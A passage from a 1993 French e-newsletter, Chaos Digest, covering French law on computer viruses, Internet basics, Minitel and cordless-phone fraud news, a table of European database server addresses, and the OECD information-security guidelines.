economique
et, enfin, l'influence du milieu social et culturel avec l'echelle des valeurs
sociales qu'il implique, lesquels facteurs jouent, s'agissant des virus
informatiques, un role bien plus importants.

La typologie des delinquants, auteurs de virus, est, en l'absence d'une
criminalite legale, c'est a dire jugee par les Tribunaux, difficile a brosser.

L'on peut cependant, sans hesitation, affirmer que, pour l'entreprise, le
premier danger vient de l'interieur.

- Le salarie: ca n'est ici une nouveaute pour personne. Le salarie, ou plus
generalement l'employe mecontent, pourra etre tente d'avoir recours au virus
pour assouvir une vengeance ou une frustration. Il est parfois, de plus, le
mieux place pour detourner les mesures de securite mises en place.

Plus generalement, le virus, et ses effets massivement destructeurs, est une
aubaine pour les psychopathes en tout genre nourris d'une rancune globale
contre
la societe.

- Les clubs informatique: par le passe, les clubs informatiques se sont
reveles
parfois etre des createurs et diffuseurs de virus.

C'est ainsi que le "Chaos computer club" (CCC) de Hambourg a realise en 1988
un
kit de virus pour ATARI ST.

Dans la meme categorie de delinquant, peuvent etre egalement classes les
etudiants surdoues jeunes genies de l'informatique en tout genre, aux
motivations essentiellement ludiques. Ceux la font regulierement la une des
medias.

- Concurrents: la concurrence dans le commerce se doit d'etre loyale. Ce
principe tout theorique souffre malheureusement d'exceptions quotidiennes qui,
pour une large part, sont traitees par les Tribunaux.

L'espionnage industriel, le sabotage ou la desorganisation du concurrent
pourraient tres bien etre le fait d'un virus informatique.

Terrorisme et activisme politique: enfin, l'interet porte par des services de
contre espionnage, comme en France la DST, montre que le virus peut etre
egalement une arme politique tournee contre les Etats. Le virus Jerusalem
etait
par exemple destine a entrer en action le jour de la proclamation de la
creation
de l'Etat d'Israel.


2.2  L'action ou l'omission contraire a l'ordre social et causant un trouble

C'est le pouvoir legislatif qui decide souverainement du caractere antisocial
d'un fait.

S'agissant des virus, le legislateur francais a decide que l'acces ou le
maintien indu dans un "systeme de traitement automatise de donnees", l'entrave
au fonctionnement, l'introduction de donnees, etaient des actes anti-sociaux.

Rapporte aux virus, quelle est la traduction des textes.

- ecrire un virus:

Ecrire un virus informatique, c'est ecrire un programme d'ordinateur. Aux
termes
des lois francaises sur la propriete litteraire et artistique du 11 mars 1957,
modifiee par la loi du 3 juillet 1985, codifiee par une loi du 1er juillet
1992 au sein du Code de la Propriete intellectuelle, un logiciel est une
oeuvre de l'esprit protegee comme telle, dans sa forme, par le droit d'auteur.

L'auteur, qui peut donc se prevaloir d'un monopole d'exploitation qui lui est
confere par la loi, est la personne physique qui a fait acte de creation.

Les salaries, quant a eux, lorsqu'ils ont agi dans l'exercice de leurs
fonctions, deferent leurs droits d'auteur au profit de l'employeur.

Ces regles ont ete grandement confirmees au niveau de la communaute
europeenne,
par une directive du Conseil des Communautes europeennes datee du 11 mai 1991,
qui devrait etre prochainement transcrite en droit francais.

On peut affirmer que la simple ecriture d'un virus, "dans son coin", n'est pas
en soi un acte reprehensible et passible des sanctions penales edictees par la
loi du 5 janvier 1988.

Bien evidemment, cet acte de creation ne doit pas etre un acte preparant
l'execution materielle d'une infraction, au quel cas l'auteur du virus
pourrait
etre poursuivi comme complice ou meme co-auteur de l'infraction s'il est juge,
en fonction du cas d'espece, que l'auteur du virus a pris une part principale
et directe a la commission de l'infraction.

- introduire un virus dans un systeme automatise de traitement de donnees:

Comme il a ete vu ci-avant, le simple acces ou maintien indu, dans un systeme
informatique, peut donner lieu a application de la loi penale (article #462-2
du code Penal).

A fortiori, si cette intrusion aboutit a entraver ou fausser le fonctionnement
du systeme, a porter atteinte aux donnees la loi penale s'appliquera.

La loi penale, dans tous les cas, s'appliquera qu'il y ait ou non destruction
de donnees, que le virus ait ete ou non en action, que le systeme soit pourvu
ou non d'un systeme de securite.

Egalement, comme il sera expose ci-apres, la simple tentative d'introduction
d'un virus sera punissable.

- publier les codes source d'un virus:

Cette hypothese n'est pas theorique, elle revet meme un caractere d'actualite
brulante.

On annonce, en effet, la parution imminente, en France, de la traduction
francaise du "Black Book of Computer Virus" de Marc Ludwig. Ce livre
permettrait
au commun des informaticiens de realiser, sans difficulte, un virus et
l'activer


Un certain nombre d'ouvrages de ce type sont deja parus en France, comme
"virus,
la maladie des ordinateurs" de Ralf Burger ou "virus protection, Pc et
compatibles" de Pamela Kane.

Dispose t'on d'un recours juridique contre cette future parution ?

Dans un tout autre genre, en 1986, la publication, en France, d'un ouvrage sur
le suicide intitule "suicide, mode d'emploi", avait emu l'opinion publique du
jour ou il aurait ete etabli qu'il aurait servi de support a un certain nombre
d'agissements commis par des desesperes.

Or, l'arsenal repressif francais, en 1986, ne disposait pas des moyens legaux
pour s'opposer a une telle parution. Il aura fallu la promulgation d'une loi
speciale, la loi n! 87-1133 du 31 decembre 1987, qui reprime le delit de
provocation au suicide en un nouvel article #318-1 du code Penal, pour que
l'interdiction de la parution de cet ouvrage soit serieusement envisagee bien,
qu'a ce jour, elle n'ait jamais ete ordonne.

- diffuser un virus de bonne foi:

Comme tout logiciel, le virus connait dans sa vie deux phases successives
essentielles: la phase de creation et la phase de communication de la creation
au public.

Dans sa phase de communication au public, le virus pourra etre concede ou cede
avec le programme qu'il aura contamine.

Le cedant ou concedant sera alors un diffuseur du virus de "bonne foi".

Encoure t'il alors une sanction?

Sur le plan penal, seul l'auteur du virus et ses complices eventuels seront
sanctionnes. Le diffuseur ne sera donc pas inquiete sous reserve que ses
agissements ne caracterisent la complicite.

Sur le plan civil en revanche, s'il est prouve que le diffuseur a, en
l'occurrence, fait preuve de negligence, en ne s'assurant pas, par exemple de
la presence eventuelle d'un virus, il pourra encourir une responsabilite
civile.

Les professionnels, entre eux, pourront toujours contractuellement limites,
voire exclure, leur responsabilite civile.

En revanche, vis a vis des utilisateurs/consommateurs, le professionnel ne
pourra exclure sa responsabilite civile et il devra, en consequence, faire
montre de la plus grande prudence.


2.3  les sanctions

Sur le plan penal, l'echelle des peines est elevee puisque la peine
d'emprisonnement maximale, pouvant etre prononcee, peut etre portee a trois
ans
si le fonctionnement du systeme est entrave ou fausse ou si des donnees ont
ete
introduites.

Le Tribunal peut, en outre, prononcer la confiscation des materiels ayant
servi
a commettre l'infraction (article #462-9 du Code Penal).

Sur le plan civil, la sanction consistera en la reparation du prejudice subi
par la victime.


3.  L'ABSENCE DE REACTION SOCIALE FACE AU VIRUS

3.1  Les chiffres de la criminalite informatique:

On distingue habituellement la criminalite reelle, c'est a dire celle
effectivement commise dans une periode donnee, de la criminalite apparente,
c'est a dire celle traitee par la police ou decelee, et de la criminalite
legale c'est a dire celle ayant donne lieu a condamnation par les Tribunaux.

En 1981, la totalite des plaintes et proces verbaux recus par les Parquets
s'elevaient a plus de quinze millions.

Pres d'un tiers de ces plaintes ou proces verbaux ont ete classes sans suite,
un peu moins de deux tiers de celles-ci sont des contraventions portees devant
le Tribunal de Police, seules un vingtieme de celles-ci ont ete deferees aux
juridictions criminelles ou correctionnelles et certaines de celles-ci ont
parfois donne lieu a relaxe ou acquittement.

En informatique, selon le Club de la securite informatique (CLUSIF), qui fonde
ses chiffres sur les sinistres declares par les entreprises francaises aupres
de leurs compagnies d'assurance, les pertes des entreprises, en 1991, dues a
l'informatique s'eleveraient a pres de 10,4 milliards de francs. Sur cette
somme, les pertes dues aux malveillances representeraient pres de 6 milliards
de francs de pertes, soit 57% des pertes totales. Le chiffre relatif aux
pertes
dues au virus informatique est, sur ce chiffre, difficile a etablir.

En tout etat de cause, selon une etude recente publiee par un journaliste
francais, les chiffres des pertes dues a l'informatique devraient augmenter
d'ici l'an 2005 de pres de 2 a 3,3 fois et les pertes consecutives a
l'introduction de virus devraient etre les plus galopantes.

Or, en depit de ces chiffres d'une grande importance, qui ne representent
pourtant qu'une partie de la criminalite reelle relative a l'informatique,
tous
les sinistres n'etant pas declares notamment par les particuliers, le nombre
de
saisine des Tribunaux est infime, voie quasi inexistant.


3.2 L'explication du phenomene:

L'explication la plus couramment avancee en est que les entreprises rechignent
a devoiler leurs faiblesses en les portant sur la place publique par une
plainte
ou toute autre  procedure traitee devant les Tribunaux en audiences publiques.

Il est une seconde explication moins souvent invoquee qui me semble etre tout
aussi serieuse pour expliquer le petit nombre de poursuites engagees. Cette
explication tient en la nouveaute de la legislation existante: le dispositif
repressif etant des plus recents, le corps social ne dispose pas encore du
reflexe repressif.

Enfin, la mediatisation a outrance du crime informatique est aussi
l'explication
du phenomene. Les medias ont regulierement valorise le delinquant mettant
l'accent sur le caractere intelligent des actes commis. Il est cependant du
plus
grand interet de rappeler que, s'agissant des virus, ceux-ci sont en constante
evolution. Leur caractere destructeur et, depuis peu, furtif, tend a prouver
que
la delinquance evolue et perd son caractere sympathique.


3.3  Deux illustrations:


Ministere Public /B & T: Decision inedite

Messieurs B & T sont coauteurs d'un logiciel standardise permettant la gestion
de stocks de medicaments au sein de cliniques et hopitaux.

Messieurs B & T ont confie l'edition et la diffusion de leur creation a un
editeur du sud de la France.

Un litige survint avec l'editeur qui eut pour consequence de couper les
auteurs
de la cinquantaine de cliniques utilisatrices de leur produit.

Or, pour se premunir contre le risque d'appropriation de leur creation, les
auteurs auraient insere, dans le programme d'origine, deux sous-programmes,
qu'ils auraient denommes PIEGE et DEPIEGE, qualifies par le Tribunal
"d'infection informatique a declenchement differe", c'est a dire constituant
une bombe logique.

A une date donnee, les sous-programmes devaient entrer en action pour bloquer
les systemes equipes du logiciel.

Par une manipulation simple, executee a distance par telephone, en activant le
programme DEPIEGE, les utilisateurs pouvaient debloquer leur systeme.

Sur plainte simple de l'editeur du logiciel, par ailleurs en litige commercial
avec les auteurs, le Tribunal correctionnel de CARCASSONNE, sans instruction
prealable, a juge cette affaire en novembre 1991 et un jugement a ete rendu en
janvier 1992, condamnant les auteurs, en application de l'article #462-3 du
Code
Penal, pour entrave au fonctionnement d'un systeme de traitement automatise de
donnees. Les auteurs ont ete condamnes a payer chacun, la somme de 50.000 F
d'amende.

Surtout, il a ete frappant de constater que sur la cinquantaine de cliniques
touchees par la bombe logicique, aucune n'a porte plainte ni meme ne s'est
constituee partie civile a l'audience.


L'affaire SOFT & MICRO

Dans cette affaire, un magazine de la presse informatique diffusait en mai
1991
un numero accompagne d'une disquette gratuite stockant un logiciel de gestion.

Il devait s'averer, par la suite, que la disquette etait infectee du virus
FRODO
4086.

L'affaire n'est pas encore jugee mais des a present, l'on peut constater que
sur
des milliers de lecteurs, dont certains n'ont sans doute pas manque d'executer
le logiciel contamine, deux seulement ont porte plainte.



4.  MISE EN PLACE D'UNE POLITIQUE JURIDIQUE DE LUTTE CONTRE LES VIRUS AU SEIN
    DE L'ENTREPRISE

4.1  La formation du personnel

La lutte contre les virus passe obligatoirement par la mise en place, au sein
des entreprises, d'une politique coherente de securite face au risque
informatique.

Cette politique coherente doit etre orientee vers l'homme, facteur de risque
numero un.

Aussi, la reponse passe, notamment, par une bonne formation du personnel qui
devra etre rompu aux questions juridiques relatives aux virus.

Les textes repressifs existent, ils fixent la norme au dela de laquelle un
acte
sera considere comme antisocial et susceptible d'etre reprime: c'est ici le
caractere preventif des textes qui doit etre mis en avant.

Les salaries doivent egalement connaitre les droits des entreprises et la
procedure a suivre en cas de survenance d'un virus: ils devront avoir
parfaitement conscience du fait que cette question peut egalement avoir pour
l'entreprise, une reponse juridique.


4.2  Une reaction sociale vigoureuse

La question des virus n'est pas une question ineluctable et les entreprises ne
sont pas condamnees a attendre de pied ferme, l'eventuelle attaque d'un virus.

La meilleure reponse defensive consiste a reagir avec vigueur a toute
agression
ou tentative d'agression exterieure.

En effet, les textes repressifs francais, la loi du 5 janvier 1988, permettent
a l'agresse de reagir judiciairement en cas d'attaque manquee et meme de
simple
tentative.

L'article #462-7 du Code Penal dispose que "la tentative des delits prevus
(...)
est punie des memes peines que le delit lui meme".

Aussi, en cas de simple tentative d'intrusion d'un virus, l'agresse pourra
t'il
porter plainte aupres du Parquet, lequel dispose de moyens d'investigations
tres
etendus devant lui permettre de retrouver la trace du delinquant.

La question des virus a une reponse juridique, c'est une certitude et personne
ne pourra pretendre qu'il existe, a ce jour, en la matiere, en France, un vide
juridique.

La reponse juridique est encore peu usitee par les victimes de virus, parce
qu'elle est crainte ou peu connue.

En depit de ce relatif succes, le legislateur francais a confirme sa volonte
de
sanctionner de tels agissements.

C'est ainsi que le nouveau Code Penal qui, selon les plus optimistes, devrait
entrer en application en avril 1993, a repris pour l'essentiel la loi Godfrain
du 5 janvier 1988, pour la completer meme par de nouvelles infractions
relatives
aux systemes informatiques.

Il ne tient donc plus, desormais, qu'aux sujets de droit, de faire valoir
leurs
droits.

------------------------------

End of Chaos Digest #1.02
************************************

Chaos Digest               Lundi 18 Janvier 1993           Volume 1 : Numero 3

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.03 (18 Janv 1993)
File 1--InterNet, Presentation de base
File 2--Reference CCCF dans la banque de donnees des associations
File 3--Pirates du Minitel travaillant chez France Telecom
File 4--NUAs de serveurs Europeens
File 5--Phreacking reconnu par la DG de France Telecom
File 6--OCDE, Directives pour la securite des systemes d'information

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be contacted
by
voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at: Jean-Bernard
Condat,
Chaos Computer Club France [CCCF], 47 rue des Rosiers, 93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also may
be
obtained from the mail server at jbcondat@attmail.com: all incoming messages
containing "Request: ChaosD #x.yy" in the "Suject:" field are answered (x is
the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views.  ChaosD
material may be reprinted for non-profit as long as the source is cited.  Some
authors do copyright their material, and they should be contacted for reprint
permission.  Readers are encouraged to submit reasoned articles in French,
English or German languages relating to computer culture and telecommunica-
tions.  Articles are preferred to short responses.  Please avoid quoting
previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Fri Nov 20 14:25:16 CDT 1992
From: NPRESTON@SUVM.ACS.SYR.EDU (Nancy Preston )
Subject: File 1--InterNet, Presentation de base
Copyright: "ERIC Digests are in the public domain and may be freely
           reproduced and disseminated".


ERIC DIGEST               ERIC Clearinghouse on Information Resources
EDO-IR-92-7
                                   Syracuse University September 1992
                                        Syracuse, New York 13244-2340
                                                Phone: (315) 443-3640
                                                  Fax: (315) 443-5448
                                     Internet:  ERIC@SUVM.ACS.SYR.EDU


                            INTERNET BASICS

                            By Roy Tennant

This digest briefly describes the Internet computer network, the
physical connections and logical agreements that make it possible,
and the applications and information resources the network provides.

The Internet

The Internet is a worldwide network of computer networks. It is
comprised of thousands of separately administered networks of many
sizes and types. Each of these networks is comprised of as many as
tens of thousands of computers; the total number of individual users
of the Internet is in the millions. This high level of connectivity
fosters an unparalleled degree of communication, collaboration,
resource sharing, and information access. In the United States, the
National Science Foundation Network (NSFNet) comprises the Internet
"backbone" (a very high speed network that connects key regions
across the country). The NSFNet will likely evolve into the National
Research and Education Network (NREN) as defined in the High-
Performance Computing Act of 1991 (P.L. 102-194, signed into law by
President Bush on December 9, 1991).

Physical Connections and Logical Agreements

For the Internet to exist, there must be connections between
computers and agreements on how they are to communicate. Connections
can consist of any of a variety of communication media or methods:
metal wires, microwave links, packet radio or fiber optic cables.
These connections are usually established within areas or regions by
the particular networking organization with authority or economic
interest in that area. For example, a university academic department
may lay Ethernet cable to connect its personal computers and
workstations into a local area network (LAN), which is then connected
to the cables the campus laid to connect its buildings together,
which is then linked to cables laid by a regional network, which
itself ties into the NSFNet backbone, the infrastructure for which
was funded by the U.S. government. Therefore the path between any two
points on the Internet often traverses physical connections that are
administered by a variety of independent authorities.

For disparate computers (from personal computers to mainframes) to
communicate with other computers over a network, there must be
agreements on how that should occur. These agreements are called
communication protocols. At present, the Transmission Control Protocol/
Internet Protocol (TCP/IP) suite of protocols defines how
Internet computers are to communicate. In the future, the Open
Systems Interconnection (OSI) suite of protocols promulgated by the
International Standards Organization (ISO) may be supported on the
Internet as well. These protocols define how certain applications are
to be accomplished:  electronic messaging, online connections, and
the transfer of files.

Electronic Mail

Electronic mail, or e-mail, is a fast, easy, and inexpensive way to
communicate with other Internet users around the world. In addition,
it is possible for Internet users to exchange e-mail with users of
other independent networks such as CompuServe, Applelink, the WELL,
and others. Internet users often find that the expanded capability to
communicate with colleagues around the world leads to important new
sources of information, collaboration, and professional development.

Besides basic correspondence between two network users, e-mail
presents additional opportunities for communication. Through various
methods for distributing e-mail messages to lists of "subscribers,"
e-mail supports electronic discussions on a wide range of topics.
These discussions bring together like-minded individuals who use such
forums for discussing common problems, sharing solutions, and arguing
issues.

Another type of electronic communication that is growing in
popularity is the electronic journal, or "e-journal." Although some
e-journals require certain types of software and hardware to display
each issue, most e-journals are distributed to a list of subscribers
as an e-mail text message, either complete as one issue, or
retrievable at the article level by mailing a command to a software
program that automatically sends the appropriate file. The very
definition of a "journal" is undergoing change in the electronic
environment, as e-journal publishers experiment with different
publication models (e.g., sending articles out individually as soon
as they are ready rather than waiting until a group of articles are
gathered for an "issue").

Remote Login

Remote login is the ability of a computer user in one location to
establish an online connection with another computer elsewhere. Once
a connection is established with a remote computer, the user can use
that remote system as if their computer were a hard-wired terminal of
that system. Within the TCP/IP protocol suite, this facility is
called Telnet. Utilizing Telnet, an Internet user can establish
connections with a multitude of bibliographic databases (primarily
library catalogs), campus information systems of various
universities, full-text databases, data files (e.g., statistics,
oceanographic data, meteorologic data, geographic data, etc.), and
other online services. Many of these systems are available for any
Internet user to access and use without an account.

What makes this application truly remarkable is that ease and speed
of access are not dependent upon proximity. An Internet user can
connect to a system on the other side of the globe as easily as (and
generally not much slower than) he or she can connect to a system in
the next building. In addition, since many Internet users are not at
present charged for their network use by their institutions, or at
least are not charged by the level of their use, cost is often not a
significant inhibitor of usage. Therefore the barriers of distance,
time and cost, which are often significant when using other forms of
electronic communication, can be reduced in the Internet environment.
A compensating disadvantage is that initial costs for Internet
connection can be high, and access can be technically demanding.

File Transfer

Another application of the Internet is the ability to transfer files
from one Internet-connected computer to another. This function is
provided by the File Transfer Protocol (FTP) of the TCP/IP protocol
suite. In a method similar to using Telnet, network users initiate an
online connection with another Internet computer via FTP. But unlike
Telnet, this online connection can perform only functions related to
locating and transferring files. This includes the ability to change
directories, list files, retrieve files, etc.

Types of files that can be transferred using FTP include virtually
every kind of file that can be stored on a computer: text files,
software programs, graphic images, sounds, files formatted for
particular software programs (e.g., files with word processing
formatting instructions), and others. Many computer administrators
have set aside portions of their machines to offer files for anyone
on the Internet to retrieve. These archive sites support "anonymous"
logins that do not require an account to access, and therefore are
called anonymous FTP sites. To locate files, Internet users can use
the Archie service, which indexes files from over 900 separate
anonymous FTP sites (Tennant, 1993).

Extended Services

The three basic Internet applications of electronic mail, remote
login, and file transfer are also building blocks of more
sophisticated applications that usually offer increased functionality
and ease of network use. Tools such as Gopher, WAIS, and World Wide
Web go beyond the three basic Internet functions to make information
on the network easier to locate and use. Gopher is a project of the
University of Minnesota that uses a series of menus to organize and
automate access to information and other online systems wherever they
reside on the Internet. The Wide Area Information Servers (WAIS)
project of Thinking Machines, Apple Computer, Dow Jones & Co., and
KPMG Peat Marwick, seeks to provide a common interface to a multitude
of Internet databases. World Wide Web is a hypertext interface to
Internet information resources that was developed at CERN in
Switzerland (Tennant, 1993). This trend toward more powerful, user-
friendly networked information resource access systems is likely to
continue as the Internet grows and matures.

Future Possibilities

The backbone infrastructure for the United States portion of the
Internet (the NSFNet, or the Interim NREN) is largely supported
through federal government funding. For this reason, use of the
network has been limited to non-profit research and educational uses,
and commercial companies have established networking arrangements
that avoid using the NSFNet. Most recently, however, dialogues have
begun about commercialization and privatization of the NSFNet
infrastructure. The full effects of such a move on current Internet
users, especially research and educational institutions, has yet to
be seen. One certainty is that the breadth of information and the
services offered on the Internet will continue to burgeon, at an ever
more rapid rate.

Further Reading

Bishop, Ann P. (1991, December). The National Research and Education
Network (NREN): Update 1991. ERIC Digest. Syracuse, NY: ERIC
Clearinghouse on Information Resources. (EDO-IR-91-9).  [Also in ERIC
as ED 340 390]

Farley, Laine (Ed.). (1991). Library resources on the Internet:
Strategies for selection and use. Chicago, IL: Reference and Adult
Services Section, American Library Association.

Kehoe, Brendan P. (1993). Zen and the art of the Internet: A
beginner's guide to the Internet. (2nd ed.). Englewood Cliffs, NJ:
Prentice Hall.

Lynch, Clifford, & Preston, Cecilia. (1990). Internet access to
information resources. In Martha E. Williams (Ed.), Annual review of
information science and technology.  26 (pp. 263-312). Medford, NJ:
Learned Information.

Malkin, Gary Scott, & Marine, April N. (1992). FYI on questions and
answers: Answers to commonly asked "new Internet user" questions.
Network Working Group, Request for Comments 1325. [Available through
anonymous FTP from host ftp.nisc.sri.com, directory rfc, filename
rfc1325.txt]

Polly, Jean Armour. (1992). Surfing the Internet: An introduction.
Wilson Library Bulletin. 66(10), 38-42+.

Scientific American. (1991). Special issue: Communications,
computers, and networks. 265(3).

Stanton, Deidre E. (1992). Using networked information resources: A
bibliography. Perth, WA: Author. [Available through anonymous FTP
from host infolib.murdoch.edu.au, directory pub/bib, filename
stanton.bib or stanton.bib.wp]

Tennant, Roy; Ober, John; & Lipow, Anne G. (1993). Crossing the
Internet threshold: An instructional handbook. Berkeley, CA: Library
Solutions Press.

U.S. Congress. (1991). High-Performance Computing Act of 1991. Public
Law 102-194, December 9, 1991. Washington, DC: U.S. Government
Printing Office. [Available through anonymous FTP from host
nnsc.nsf.net, directory nsfnet, filename nrenbill.txt]

------------------------------

Date: Thu Nov 19 14:30:45 -0500 1992
From: eekim@husc.harvard.edu (Eugene Eric Kim )
Subject: File 2--Reference CCCF dans la banque de donnees des associations
Copyright: Encyclopedia of Associations, 1992

Au detour d'une d'une recherche dans les banques de donnees americaines, un
de nos jeunes correspondant americain, Eugene Eric Kim, nous envoya la
reference correspondant au CCCF dans le fichier de toutes les associations
de part le monde. En voici le contenu:

+++++++
07996366  EA ENTRY NO.: 003634 (International Organizations)
  Chaos Computer Club France  (CCCF)
  Boite Postale 8005, F-69351 Lyon Cedex 08, France
  Phone: +33 1 40101775, Fax: +33 1 40101764
  Jean-Bernard Condat, Gen.Sec.
  FOUNDED:  1989.  MEMBERS: 72. STAFF: 4. BUDGET: $12,000. LOCAL GROUPS: 7.
NATIONAL.  Disseminates information on security products for micro and mini
computers.  Promotes  interest in cryptology (the scientific study of codes
and  ciphers);  will  attempt  to decipher and format cryptograms. Provides
system  audits;  offers courses on cryptography and industry documentation.
TELECOMMUNICATIONS   SERVICES:  E-mail:  jbcondat@attmail.com.  COMMITTEES:
Computer Frauds; Computer Viruses; Spy Instruments; Unix.
  PUBLICATIONS:   CCCF   Newsletter,   monthly.   *  Membership  Directory,
semiannual. * Proceedings, annual.
  CONVENTION/MEETING: annual (with exhibits).
  SECTION HEADING CODES: Engineering, Technological, and Natural and Social
    Sciences Organizations (04)
  DESCRIPTORS: Computer Users; Cryptology
+++++++

Don't hesitate to answer me soonly :-)

Thanks.

 ______   ______   __   __
/\  ___\ /\  ___\ /\ \  \ \     Eugene Eric Kim '96 Harvard University
\ \ \__/ \ \ \__/ \ \ \_\ \     INTERNET: eekim@husc.harvard.edu
 \ \  _\  \ \  _\  \ \   -_     #########################################
  \ \ \/__ \ \ \/__ \ \ \-\ \   "Every man of action has an equal dose of
   \ \____\ \ \____\ \ \_\  \_\  egotism, pride, cunning, and courage."
    \/____/  \/____/  \/_/ \/_/                       --Charles de Gaulle

------------------------------

Date: Mon Jan 11 14:07:03 MST 1993
From: imp@Boulder.ParcPlace.COM (Warner Losh )
Subject: File 3--Pirates du Minitel travaillant chez France Telecom
Copyright: Agence France Presse, 1992

    Fraude minitel -  Des ministeres ou administrations victimes de
"pirates du minitel" : un prejudice de plusieurs millions de francs-
PARIS, 1er oct  92 (250 MOTS)
  Des administrations ou ministeres ont ete victimes a Paris ces
derniers mois de "pirates du minitel" travaillant a France-Telecom,
et huit personnes ont ete inculpees alors que le prejudice est
globalement estime a des millions de francs, apprend-on jeudi de
bonne source.
  Une estimation precise du prejudice etait, indique-t-on, "difficile
a etabir en l'etat actuel de l'enquete".
   Des tehniciens de France-Telecom sont soupconnes de s'etre
"branches" illegalement, a l'insu des victimes, sur leurs lignes
telephoniques empruntees par le minitel. Ils ont "largement profite"
de celles-ci, appelant par exemple des serveurs specialises dans des
jeux sur ecran ou, ajoute-t-on, "les communications s'eternisent
quand il s'agit de remporter un lot".
   Le palais de justice a Paris s'est apercu le premier de cette
escroquerie presumee - reprimee par la recente loi sur l'informatique
- en constatant une note "tres elevee" de minitel. Celle-ci aurait en
effet atteint, ajoute-t-on, quelque 800.000 francs sur plusieurs
mois. Le Senat, les ministeres des affaires etrangeres ou des DOM-TOM
figureraient notamment au nombre des victimes.
      Une enquete a ete ouverte puis confiee a la Brigade financiere
de Paris qui a procede, en debut de semaine, a une quinzaine
d'interpellations de suspects en region parisienne. Huit d'entre eux
ont ete presentes au juge Linais jeudi puis inculpes et laisses en
liberte sous controle judiciaire. D'autres inculpations "pourraient
suivre" ces prochains jours, conclut-on.
   rb/da

------------------------------

Date: Sun Jan 10 13:00:58 -0500 1993
From: as194@cleveland.Freenet.edu (Doren Rosenthal )
Subject: File 4--NUAs de serveurs Europeens


Serveur                               NUA
---------------------------           ------------------------
ARDIC-CIDA                            175000120
CARTERMILL                            0234233400101
CSPP                                  023424126010604
DATA STAR                             0228464110115
DBI                                   026245300040020
ECHO                                  0270448112
ECODATA                               022846410908014
EPO                                   02041170121
ESA-IRS                               175000394
                                      0234219201156
FINSBURY                              0234219200101
FIZ TECHNIK                           026245724740001
GENIOS                                026245400030296
GEOSYSTEMS                            0234290840111
INKA-DATA                             026245724740001
INPADOC                               0232911602323
JURIDIAL                              1061902007
KLUMER DATALEX                        02041570020
OPOCE                                 0270429200
PROFILE                               0234213300124
QUESTEL                               1061902007
SCICON                                0234290840111
SLIGOS                                192020028
TELECOM GOLD                          023421920100479
THERMODATA                            138020100
---------------------------           ------------------------

Pour obtenir un de ces ordinateurs, il est necessaire d' obtenir un acces
Transpac par le 36062424 et de composer le NUA souhaite, suivi dans le cas
d'un systeme non fran
ais [=NUA commencant par un 0], de "P" et du NUI de six
caracteres.

------------------------------

Date: Thu Nov 19 10:38:32 CDT 1992
From: KRIZ@VTVM1.CC.VT.EDU (Harry M. Kriz )
Subject: File 5--Phreacking reconnu par la DG de France Telecom

Rubrique: Actualites
Messages, no. 419, Novembre 1992, page 5 (ISSN 0245-6001)

     Mauvaise surprise pour les abonnes de la banlieue nord de Paris: pres
d'un
millier d'entre eux ont vu leurs factures de telephone gonfler a la suite d'un
piratage de ligne.

     Renseignements pris, toutes ces personnes etaient en possession de
telephones sans fil non agrees. Il faut savoir que ces appareils, souvent
importes de l'etranger, ne possedent pas la meme protection electronique que
les telephones agrees. Des lors, rien n'interdit a un "pirate" muni d'un
telephone sans fil de se poster a proximite et de trouver, par tatonnement,
une frequence disponible qu'il utilise aux frais de l'abonne.

     Pour eviter que de pareilles malversations ne se reproduisent, la
Direction de la reglementation generale du ministere des P et T va lancer
d'ici
la fin de l'annee une nouvelle campagne d'information sur l'agrement.

------------------------------

Date: Tue 22 Dec 1992 14:19:51 EDT
From: Marc_Rotenberg@WASHOFC.CPSR.ORG (Marc Rotenberg )
Subject: File 6--OCDE, Directives pour la securite des systemes d'information

                       OECD SECURITY GUIDELINES

        The Organization for Economic Cooperation and Development
(OECD) has adopted international Guidelines for the Security of
Information Systems.  The Guidelines are intended to raise awareness
of the risks in the use of information systems and to establish a
policy framework to address public concerns.

        A copy of the press release and an excerpt from the Guidelines
follows.  For additional information or for a copy of the guidelines,
contact Ms. Deborah Hurley, OECD, 2 rue Andre-Pascal, 75775 Paris
Cedex 16, 33-1-45-24-93-96 (phone) 33-1-45-24-93-32 (fax).

Marc Rotenberg, Director
CPSR Washington office and Member,
OECD Expert Group on Information System Security
rotenberg@washoc.cpsr.org

=============================================================

"OECD ADOPTS GUIDELINES FOR THE SECURITY OF INFORMATION SYSTEMS

        "The 24 OECD Member countries on 26th November 1992 adopted
Guidelines for the Security of Information Systems, culminating almost
two years' work by an OECD expert group composed of governmental
delegates, scholars in the fields of law, mathematics and computer
science, and representatives of the private sector, including computer
and communication goods and services providers and users.

        "The term information systems includes computers,
communication facilities, computer and communication networks and the
information that they process.  These systems play an increasingly
significant and pervasive role in a multitude of activities, including
national economies, international trade, government and business
operation, health care, energy, transport, communications and
education.

        "Security of information systems means the protection of the
availability, integrity, and confidentiality of information systems.
It is an international issue because information systems frequently
cross national boundaries.

        "While growing use of information systems has generated many
benefits, it has also shown up a widening gap between the need to
protect systems and the degree of protection currently in place.
Society has become very dependent on technologies that are not yet
sufficiently dependable.  All individuals and organizations have a
need for proper information system operations (e.g. in hospitals, air
traffic control and nuclear power plants).

        "Users must have confidence that information systems will be
available and operate as expected without unanticipated failures or
problems.  Otherwise, the systems and their underlying technologies
may not be used to their full potential and further growth and
innovation may be prohibited.

        "The Guidelines for the Security of Information Systems will
provide the required foundation on which to construct a framework for
security of information systems.  They are addressed to the public and
private sectors and apply to all information systems.  The framework
will include policies, laws, codes of conduct, technical measures,
management and user practices, ad public education and awareness
activities at both national and international levels.

        "Several OECD Member countries have been forerunners in the
field of security of information systems.  Certain laws and
organizational and technical rules are already in place.  Most other
countries are much farther behind in their efforts.  The Guidelines
will play a normative role and assist governments and the private
sector in meeting the challenges of these worldwide systems.  The
Guidelines bring guidance and a  real value-added to work in this
area, from a national and international perspective."

PRINCIPLES

"1. Accountability Principle

